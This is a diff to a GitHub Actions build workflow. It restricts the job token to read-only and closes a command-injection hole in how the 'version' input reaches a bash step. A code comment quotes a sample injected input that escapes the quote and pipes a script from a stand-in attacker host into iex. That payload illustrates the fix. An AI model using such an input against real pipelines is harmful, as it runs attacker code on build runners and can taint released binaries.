@@ -28,6 +28,13 @@ on:
         required: false
         type: string
 
+# Only what the job needs: check out the tree and upload an artifact.
+# Without this block the job inherits the repository default, which on a
+# repo that never changed it is write-all — so any mistake in a step
+# below runs with a token that can push.
+permissions:
+  contents: read
+
 jobs:
   build:
     runs-on: windows-latest
@@ -54,10 +61,22 @@ jobs:
       # Everything else falls back to git describe, which on a tagged
       # commit is that tag and otherwise is the last tag plus the
       # distance past it — the honest answer for a build off main.
+      #
+      # The input arrives through the environment rather than through
+      # ${{ }}. Expression substitution is textual and happens before bash
+      # parses the line, so an input of
+      #     '; curl -s https://attacker/x.ps1 | iex; echo '
+      # closed the quote and ran as commands on the runner — with the
+      # job's token, and on the tree that produces the released
+      # localcode-gui.exe. Dispatch needs write access, so it was
+      # escalation from write-to-repo rather than anonymous RCE, but the
+      # environment removes the substitution step entirely.
       - name: Resolve version
         shell: bash
+        env:
+          LC_INPUT_VERSION: ${{ inputs.version }}
         run: |
-          v='${{ inputs.version }}'
+          v="$LC_INPUT_VERSION"
           [ -n "$v" ] || v="$(git describe --tags --always | sed 's/^v//')"
           echo "resolved version: $v"
           echo "LC_VERSION=$v" >> "$GITHUB_ENV"
